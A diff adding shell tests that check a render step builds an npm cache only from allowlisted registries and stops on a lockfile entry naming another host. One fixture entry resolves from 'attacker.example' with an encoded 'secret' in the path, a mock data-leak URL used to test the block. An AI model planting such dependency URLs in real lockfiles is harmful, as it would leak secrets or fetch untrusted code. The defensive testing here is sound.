@@ -223,6 +223,52 @@ teardown() {
 	assert_output "[\"$REV\",{\"builder\":\"$TEST_TEMP_DIR/store/fabriek-role-builder\",\"reviewer\":\"$TEST_TEMP_DIR/store/fabriek-role-reviewer\"},\"$ETC/pi-decider\"]"
 }
 
+## A package-lock.json at the pin, committed to the repository the factory
+## works. Each argument is an entry of its packages as JSON.
+commit_lock() {
+	jq -n --argjson packages "$1" '{name: "app", lockfileVersion: 3, packages: ({"": {name: "app"}} + $packages)}' >"$REPO/package-lock.json"
+	git -C "$REPO" add package-lock.json
+	git -C "$REPO" -c commit.gpgsign=false commit -qm lock
+	REV="$(git -C "$REPO" rev-parse HEAD)"
+	sed -i "s/^rev = .*/rev = \"$REV\"/" "$CRED"
+}
+
+# ADR-046: the commit's npm artifacts, fetched on the host at render from
+# an allowed registry and laid out once for every role to resolve from.
+@test "given a package-lock.json at the pin, render builds one npm cache from its artifacts and links it for the sessions" {
+	commit_lock '{"node_modules/tiny": {"resolved": "https://registry.npmjs.org/tiny/-/tiny-1.0.0.tgz", "integrity": "sha512-AAAA"}}'
+	run_fabriek_container factory-render
+	assert_success
+	run grep -c 'npm-cache.nix' "$CALLS/nix-build"
+	assert_output 1
+	run grep 'npm-cache.nix' "$CALLS/nix-build"
+	assert_output --partial '--restrict-eval'
+	assert_output --partial 'https://registry.npmjs.org/tiny/-/tiny-1.0.0.tgz'
+	assert_output --partial 'sha512-AAAA'
+	[ "$(readlink "$ETC/cache/npm")" = "$TEST_TEMP_DIR/store/fabriek-npm-cache" ]
+}
+
+# A fixed-output hash checks what came back, not where the request went.
+@test "a lockfile naming a host off the allowlist stops render by entry, and nothing of it is built" {
+	commit_lock '{"node_modules/leak": {"resolved": "https://attacker.example/c2VjcmV0.tgz", "integrity": "sha512-AAAA"}}'
+	run_fabriek_container factory-render
+	assert_failure
+	assert_output --partial "node_modules/leak: attacker.example is not an allowed registry"
+	run grep -c 'npm-cache.nix' "$CALLS/nix-build"
+	assert_output 0
+	[ ! -e "$ETC/cache/npm" ]
+}
+
+@test "a repository with no package-lock.json at the pin has no npm cache, and one an earlier pin left is unlinked" {
+	mkdir -p "$ETC/cache"
+	ln -s "$TEST_TEMP_DIR/store/stale" "$ETC/cache/npm"
+	run_fabriek_container factory-render
+	assert_success
+	run grep -c 'npm-cache.nix' "$CALLS/nix-build"
+	assert_output 0
+	[ ! -L "$ETC/cache/npm" ]
+}
+
 @test "a role whose profile does not build is refused by name, and no session can start on it" {
 	touch "$CALLS/fail-builder"
 	run_fabriek_container factory-render
